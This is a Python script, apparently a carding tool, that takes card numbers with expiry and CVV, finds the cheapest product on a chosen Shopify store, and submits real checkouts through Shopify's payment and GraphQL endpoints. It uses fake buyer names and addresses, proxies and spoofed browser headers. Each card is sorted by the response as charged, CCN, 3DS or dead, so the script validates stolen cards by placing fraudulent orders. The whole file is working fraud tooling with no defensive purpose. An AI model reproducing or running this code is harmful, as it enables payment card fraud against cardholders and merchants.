import sys
import os
from fake_useragent import UserAgent
import requests
from urllib.parse import urlparse
import json
import time
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MAX_RETRIES = 5

# Initialize UserAgent generator
ua = UserAgent().chrome

# Load GraphQL queries from files
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
GRAPHQL_DIR = os.path.join(SCRIPT_DIR, 'graphql')

def load_query(name):
    path = os.path.join(GRAPHQL_DIR, f'{name}.graphql')
    with open(path, 'r') as f:
        return f.read()

PROPOSAL_QUERY = load_query('proposal')
SUBMIT_QUERY = load_query('submit')
POLL_QUERY = load_query('poll')

def find_between(content, start, end):
    try:
        start_pos = content.index(start) + len(start)
        end_pos = content.index(end, start_pos)
        return content[start_pos:end_pos]
    except ValueError:
        return ''

def get_proxy(proxy_string):
    if not proxy_string:
        return None
    parts = proxy_string.split(':')
    if len(parts) >= 4:
        proxy_host = parts[0]
        proxy_port = parts[1]
        proxy_username = parts[2]
        proxy_password = parts[3]
        proxy_url = f"http://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    return None

def make_request_with_proxy(url, method='GET', headers=None, json_data=None, data=None, cookies=None, timeout=15, proxy=None):
    for attempt in range(MAX_RETRIES):
        try:
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, proxies=proxy, 
                                      verify=False, timeout=timeout, cookies=cookies)
            elif method.upper() == 'POST':
                response = requests.post(url, headers=headers, json=json_data, 
                                       data=data, proxies=proxy, verify=False, 
                                       timeout=timeout, cookies=cookies)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")
            
            response.raise_for_status()
            return response
            
        except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
            print(f"[Retry {attempt + 1}/{MAX_RETRIES}] Network error for {url}: {e}", file=sys.stderr)
            time.sleep(1)
            
            if attempt == MAX_RETRIES - 1:
                raise Exception(f"Failed after {MAX_RETRIES} attempts: {e}")

def get_address_details(country_code):
    if country_code == 'US':
        return {
            'address': "420 Park ave",
            'city': "New York",
            'state': "NY",
            'zip': "10016",
            'phone': "(879) 658-2525",
            'country': "United States",
            'currency': "USD",
            'zone_code': "NY",
            'latitude': 41.1456,
            'longitude': -73.9876
        }
    elif country_code == 'AU':
        return {
            'address': "134 Buckhurst Street",
            'city': "South Melbourne",
            'state': "VIC",
            'zip': "3205",
            'phone': "07 3803 6136",
            'country': "Australia",
            'currency': "AUD",
            'zone_code': "VIC",
            'latitude': -37.8351,
            'longitude': 144.9571
        }
    else:
        return {
            'address': "133 New York 59",
            'city': "Monsey",
            'state': "NY",
            'zip': "10952",
            'phone': "(879) 658-2525",
            'country': "United States",
            'currency': "USD",
            'zone_code': "NY",
            'latitude': 41.1456,
            'longitude': -73.9876
        }

def check_card(cc_string, site_url, proxy_string=""):
    """Main card checking function - matches original tool exactly"""
    
    # Parse card
    try:
        cc_parts = cc_string.strip().split('|')
        if len(cc_parts) < 4:
            return {'status': 'dead', 'message': 'Invalid card format'}
        
        cc = cc_parts[0]
        month = cc_parts[1]
        year = cc_parts[2]
        cvv = cc_parts[3]
        
        if len(year) <= 2:
            year = f"20{year}"
        
        sub_month = str(int(month))
        
    except Exception as e:
        return {'status': 'dead', 'message': f'Error parsing card: {str(e)}'}
    
    proxy = get_proxy(proxy_string)
    
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    
    parsed_url = urlparse(site_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        return {'status': 'dead', 'message': 'Invalid URL'}
    
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    domain = parsed_url.hostname
    products_url = f"{base_url}/products.json"
    
    # Step 0: Get product
    headers = {
        'User-Agent': ua,
        'Accept': 'application/json',
    }
    
    try:
        response = make_request_with_proxy(products_url, 'GET', headers=headers, proxy=proxy)
        data = response.json()
        
        if not isinstance(data, dict) or 'products' not in data:
            return {'status': 'dead', 'message': 'No products found'}
        
        min_price = None
        min_price_product_id = None
        product_title = None
        
        for product in data['products']:
            for variant in product.get('variants', []):
                price = float(variant['price'])
                if price >= 0.01 and (variant.get('available') is not False):
                    if min_price is None or price < min_price:
                        min_price = price
                        min_price_product_id = variant['id']
                        product_title = product['title']
        
        if min_price_product_id is None:
            return {'status': 'dead', 'message': 'No available products'}
        
        print(f"[LOG] Product: {product_title} | ${min_price}", file=sys.stderr)
        
    except Exception as e:
        return {'status': 'dead', 'message': f'Product fetch error: {str(e)}'}
    
    prodid = min_price_product_id
    cart_url = f"{base_url}/cart/{prodid}:1"
    
    # Step 1: Get initial session and tokens
    retry_count = 0
    while retry_count < MAX_RETRIES:
        try:
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Priority': 'u=0, i',
                'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }
            
            response = make_request_with_proxy(cart_url, 'GET', headers=headers, proxy=proxy)
            
            country_code_match = re.search(r'"supportedCountries":"([^"]+)"', response.text)
            country_code = country_code_match.group(1) if country_code_match else 'US'
            print(f"[LOG] Country code: {country_code}", file=sys.stderr)
            
            address = get_address_details(country_code)
            final_url = response.url
            
            checkout_token_match = find_between(final_url, '/cn/', '?')
            if not checkout_token_match:
                raise ValueError("Checkout token not found")
            
            web_build_id = find_between(response.text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;}')
            if not web_build_id:
                raise ValueError("Web build id not found")
            
            x_checkout_one_session_token = find_between(response.text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
            if not x_checkout_one_session_token:
                raise ValueError("Session token not found")
            
            queue_token = find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                raise ValueError("Queue token not found")
            
            stable_id = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                raise ValueError("Stable ID not found")
            
            payment_method_identifier = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not payment_method_identifier:
                raise ValueError("Payment Method Identifier not found")
            
            print(f"[LOG] Session tokens extracted", file=sys.stderr)
            break
            
        except Exception as e:
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                return {'status': 'dead', 'message': 'Failed to get session'}
            continue
    
    # Step 2: Get credit card token
    retry_count = 0
    while retry_count < MAX_RETRIES:
        try:
            token_headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.shopifycs.com',
                'referer': 'https://checkout.shopifycs.com/',
                'user-agent': ua
            }
            
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(sub_month),
                    "year": int(year),
                    "verification_value": cvv,
                    "name": "insane xd"
                },
                "payment_session_scope": domain
            }
            
            response = make_request_with_proxy("https://deposit.shopifycs.com/sessions", 
                                             'POST', headers=token_headers, json_data=payload, proxy=proxy)
            
            response2js = response.json()
            cctoken = response2js.get('id')
            if not cctoken:
                raise ValueError("Card token not returned")
            
            print(f"[LOG] Card token received: {cctoken[:30]}...", file=sys.stderr)
            break
            
        except Exception as e:
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                return {'status': 'dead', 'message': 'Card token error'}
            continue
    
    # Step 3: Get proposal and shipping
    retry_count = 0
    handle = None
    delivery_amount = None
    tax = None
    total_amount = None
    
    while retry_count < MAX_RETRIES:
        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-GB',
                'content-type': 'application/json',
                'origin': base_url,
                'referer': f'{base_url}/',
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': web_build_id,
                'x-checkout-web-source-id': checkout_token_match
            }
            
            propayload = {
                "query": PROPOSAL_QUERY,
                "variables": {
                    "sessionInput": {
                        "sessionToken": x_checkout_one_session_token
                    },
                    "queueToken": queue_token,
                    "discounts": {
                        "lines": [],
                        "acceptUnexpectedDiscounts": True
                    },
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": address['address'],
                                    "address2": "",
                                    "city": address['city'],
                                    "countryCode": country_code,
                                    "postalCode": address['zip'],
                                    "firstName": "Hell",
                                    "lastName": "King",
                                    "zoneCode": address['zone_code'],
                                    "phone": address['phone'],
                                    "oneTimeUse": False,
                                    "coordinates": {
                                        "latitude": address['latitude'],
                                        "longitude": address['longitude']
                                    }
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {}
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {
                        "deliveryExpectationLines": []
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{prodid}",
                                    "variantId": f"gid://shopify/ProductVariant/{prodid}",
                                    "properties": [{
                                        "name": "_minimum_allowed",
                                        "value": {"string": ""}
                                    }],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {
                                "items": {
                                    "value": 1
                                }
                            },
                            "expectedTotalPrice": {
                                "value": {
                                    "amount": str(min_price),
                                    "currencyCode": address['currency']
                                }
                            },
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address['address'],
                                "address2": "",
                                "city": address['city'],
                                "countryCode": country_code,
                                "postalCode": address['zip'],
                                "firstName": "Hell",
                                "lastName": "King",
                                "zoneCode": address['zone_code'],
                                "phone": address['phone']
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": address['currency'],
                            "countryCode": country_code
                        },
                        "email": "hellking@gmail.com",
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [],
                        "shopPayOptInPhone": {
                            "countryCode": country_code
                        },
                        "rememberMe": False
                    },
                    "tip": {
                        "tipLines": []
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": None,
                        "proposedTotalIncludedAmount": {
                            "value": {
                                "amount": "0",
                                "currencyCode": address['currency']
                            }
                        },
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {
                        "message": None,
                        "customAttributes": []
                    },
                    "localizationExtension": {
                        "fields": []
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": []
                    },
                    "optionalDuties": {
                        "buyerRefusesDuties": False
                    }
                },
                "operationName": "Proposal"
            }
            
            response = make_request_with_proxy(
                f"{base_url}/checkouts/unstable/graphql",
                'POST',
                headers=headers,
                json_data=propayload,
                proxy=proxy
            )
            
            if response.status_code != 200:
                raise ValueError(f"Proposal request failed with status {response.status_code}")
            
            data = response.json()
            
            seller_proposal = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal")
            
            if not seller_proposal:
                retry_count += 1
                if retry_count >= MAX_RETRIES:
                    return {'status': 'dead', 'message': 'No shipping available'}
                continue
            
            # Extract handle
            handle = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("handle", "")
            if not handle:
                handle_search = re.search(r',"selectedDeliveryStrategy":{"handle":"(.*?)","__typename":"DeliveryStrategyReference', response.text)
                handle = handle_search.group(1) if handle_search else ""
            
            if not handle:
                retry_count += 1
                if retry_count >= MAX_RETRIES:
                    return {'status': 'dead', 'message': 'Handle empty'}
                continue
            
            # Extract delivery amount
            delivery_amount = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("amount", {}).get("value", {}).get("amount", "")
            
            # Extract tax
            tax = seller_proposal.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "")
            if not tax:
                tax_search = re.search(r',"totalAmountIncludedInTarget":{"value":{"amount":"(.*?)","currencyCode":"', response.text)
                tax = tax_search.group(1) if tax_search else ""
            
            # Final total
            total_amount = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", "")
            
            print(f"[LOG] Proposal: Handle={handle[:30]}... Tax=${tax} Total=${total_amount}", file=sys.stderr)
            break
            
        except Exception as e:
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                return {'status': 'dead', 'message': f'Proposal error: {str(e)}'}
            continue
    
    # Step 4: Submit for completion
    receipt_id = None
    retry_count = 0
    while retry_count < MAX_RETRIES:
        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': base_url,
                'priority': 'u=1, i',
                'referer': f'{base_url}/',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'no',
                'x-checkout-web-source-id': checkout_token_match
            }
            
            payload = {
                "query": SUBMIT_QUERY,
                "variables": {
                    "input": {
                        "sessionInput": {
                            "sessionToken": x_checkout_one_session_token
                        },
                        "queueToken": queue_token,
                        "discounts": {
                            "lines": [],
                            "acceptUnexpectedDiscounts": True
                        },
                        "delivery": {
                            "deliveryLines": [
                                {
                                    "destination": {
                                        "streetAddress": {
                                            "address1": address['address'],
                                            "address2": "",
                                            "city": address['city'],
                                            "countryCode": country_code,
                                            "postalCode": address['zip'],
                                            "firstName": "Hell",
                                            "lastName": "King",
                                            "zoneCode": address['zone_code'],
                                            "phone": address['phone'],
                                            "oneTimeUse": False,
                                            "coordinates": {
                                                "latitude": address['latitude'],
                                                "longitude": address['longitude']
                                            }
                                        }
                                    },
                                    "selectedDeliveryStrategy": {
                                        "deliveryStrategyByHandle": {
                                            "handle": handle,
                                            "customDeliveryRate": False
                                        },
                                        "options": {}
                                    },
                                    "targetMerchandiseLines": {
                                        "lines": [
                                            {
                                                "stableId": stable_id
                                            }
                                        ]
                                    },
                                    "deliveryMethodTypes": ["SHIPPING"],
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": delivery_amount,
                                            "currencyCode": address['currency']
                                        }
                                    },
                                    "destinationChanged": False
                                }
                            ],
                            "noDeliveryRequired": [],
                            "useProgressiveRates": False,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping": True
                        },
                        "deliveryExpectations": {
                            "deliveryExpectationLines": []
                        },
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": stable_id,
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": f"gid://shopify/ProductVariantMerchandise/{prodid}",
                                            "variantId": f"gid://shopify/ProductVariant/{prodid}",
                                            "properties": [],
                                            "sellingPlanId": None,
                                            "sellingPlanDigest": None
                                        }
                                    },
                                    "quantity": {
                                        "items": {
                                            "value": 1
                                        }
                                    },
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": str(min_price),
                                            "currencyCode": address['currency']
                                        }
                                    },
                                    "lineComponentsSource": None,
                                    "lineComponents": []
                                }
                            ]
                        },
                        "payment": {
                            "totalAmount": {
                                "any": True
                            },
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_method_identifier,
                                            "sessionId": cctoken,
                                            "billingAddress": {
                                                "streetAddress": {
                                                    "address1": address['address'],
                                                    "address2": "",
                                                    "city": address['city'],
                                                    "countryCode": country_code,
                                                    "postalCode": address['zip'],
                                                    "firstName": "Hell",
                                                    "lastName": "King",
                                                    "zoneCode": address['zone_code'],
                                                    "phone": address['phone']
                                                }
                                            },
                                            "cardSource": None
                                        }
                                    },
                                    "amount": {
                                        "value": {
                                            "amount": total_amount,
                                            "currencyCode": address['currency']
                                        }
                                    },
                                    "dueAt": None
                                }
                            ],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": address['address'],
                                    "address2": "",
                                    "city": address['city'],
                                    "countryCode": country_code,
                                    "postalCode": address['zip'],
                                    "firstName": "Hell",
                                    "lastName": "King",
                                    "zoneCode": address['zone_code'],
                                    "phone": address['phone']
                                }
                            }
                        },
                        "buyerIdentity": {
                            "customer": {
                                "presentmentCurrency": address['currency'],
                                "countryCode": country_code
                            },
                            "email": "hellking@gmail.com",
                            "emailChanged": False,
                            "phoneCountryCode": country_code,
                            "marketingConsent": [],
                            "shopPayOptInPhone": {
                                "countryCode": country_code
                            }
                        },
                        "tip": {
                            "tipLines": []
                        },
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {
                                "value": {
                                    "amount": tax,
                                    "currencyCode": address['currency']
                                }
                            },
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": []
                        },
                        "note": {
                            "message": None,
                            "customAttributes": []
                        },
                        "localizationExtension": {
                            "fields": []
                        },
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {
                            "signature": None,
                            "signatureUuid": None,
                            "lineItemScriptChanges": [],
                            "paymentScriptChanges": [],
                            "shippingScriptChanges": []
                        },
                        "optionalDuties": {
                            "buyerRefusesDuties": False
                        }
                    },
                    "attemptToken": f"{checkout_token_match}-0a6d87fj9zmj",
                    "metafields": [],
                    "analytics": {
                        "requestUrl": f"{base_url}/checkouts/cn/{checkout_token_match}",
                        "pageId": stable_id
                    }
                },
                "operationName": "SubmitForCompletion"
            }
            
            submit_url = f'{base_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion'
            
            response = make_request_with_proxy(
                submit_url,
                'POST',
                headers=headers,
                json_data=payload,
                proxy=proxy
            )
            
            response_text = response.text
            
            if 'CAPTCHA_METADATA_MISSING' in response_text:
                return {'status': 'dead', 'message': 'CAPTCHA_REQUIRED', 'price': f"${total_amount}"}
            
            response_json = response.json()
            receipt_id = response_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")
            
            if receipt_id:
                print(f"[LOG] Receipt ID: {receipt_id}", file=sys.stderr)
                break
            else:
                submit_result = response_json.get("data", {}).get("submitForCompletion", {})
                errors = submit_result.get("errors", [])
                if errors:
                    error_msg = errors[0].get("localizedMessage", "") or errors[0].get("nonLocalizedMessage", "") or "Unknown error"
                    return {'status': 'dead', 'message': f"[DEAD] {error_msg}", 'price': f"${total_amount}"}
                
                retry_count += 1
                time.sleep(1)
                if retry_count >= MAX_RETRIES:
                    return {'status': 'dead', 'message': 'Receipt ID empty', 'price': f"${total_amount}"}
            
        except Exception as e:
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                return {'status': 'dead', 'message': f'Submit error: {str(e)}', 'price': f"${total_amount}"}
            continue
    
    # Step 5: Poll for receipt
    if receipt_id:
        try:
            purl = f"{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
            phead = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': base_url,
                'referer': f'{base_url}/',
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': web_build_id,
                'x-checkout-web-source-id': checkout_token_match
            }
            
            pload = {
                'query': POLL_QUERY,
                'variables': {
                    'receiptId': receipt_id,
                    'sessionToken': x_checkout_one_session_token
                },
                'operationName': 'PollForReceipt'
            }
            
            time.sleep(2)
            response = make_request_with_proxy(purl, 'POST', headers=phead, json_data=pload, proxy=proxy)
            
            response_json = response.json()
            response_text = json.dumps(response_json)
            
            if f"{base_url}/thank_you" in response_text or f"{base_url}/post_purchase" in response_text:
                return {'status': 'charged', 'message': '[CHARGED] SUCCESS!', 'price': f"${total_amount}"}
            
            elif 'Your order is confirmed' in response_text:
                return {'status': 'charged', 'message': '[ORDER PLACED] SUCCESS!', 'price': f"${total_amount}"}
            
            elif 'INCORRECT_ZIP' in response_text:
                return {'status': 'charged', 'message': '[CHARGED] INCORRECT ZIP', 'price': f"${total_amount}"}
            
            elif 'INSUFFICIENT_FUNDS' in response_text:
                return {'status': 'charged', 'message': '[CHARGED] INSUFFICIENT FUNDS', 'price': f"${total_amount}"}
            
            elif 'INCORRECT_CVC' in response_text:
                return {'status': 'ccn', 'message': '[CCN] INCORRECT CVC', 'price': f"${total_amount}"}
            
            elif 'CompletePaymentChallenge' in response_text or 'AUTHORIZATION_ERROR' in response_text:
                return {'status': '3ds', 'message': '[3DS] VERIFICATION REQUIRED', 'price': f"${total_amount}"}
            
            elif '/authentications/' in response_text:
                return {'status': '3ds', 'message': '[3DS] CARD REQUIRES 3D SECURE', 'price': f"${total_amount}"}
            
            elif 'processingError' in response_text:
                error_code = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown Error')
                error_message = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('messageUntranslated', '')
                if error_message:
                    return {'status': 'dead', 'message': f'[DEAD] {error_message}', 'price': f"${total_amount}"}
                return {'status': 'dead', 'message': f'[DEAD] {error_code}', 'price': f"${total_amount}"}
            
            else:
                return {'status': 'dead', 'message': '[DEAD] Unknown response', 'price': f"${total_amount}"}
            
        except Exception as e:
            return {'status': 'dead', 'message': f'Poll error: {str(e)}', 'price': f"${total_amount}"}
    
    return {'status': 'dead', 'message': 'Transaction failed', 'price': f"${total_amount}"}

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({'status': 'dead', 'message': 'Missing arguments'}))
        sys.exit(1)
    
    cc_string = sys.argv[1]
    site_url = sys.argv[2]
    proxy_string = sys.argv[3] if len(sys.argv) > 3 else ""
    
    result = check_card(cc_string, site_url, proxy_string)
    print(json.dumps(result))
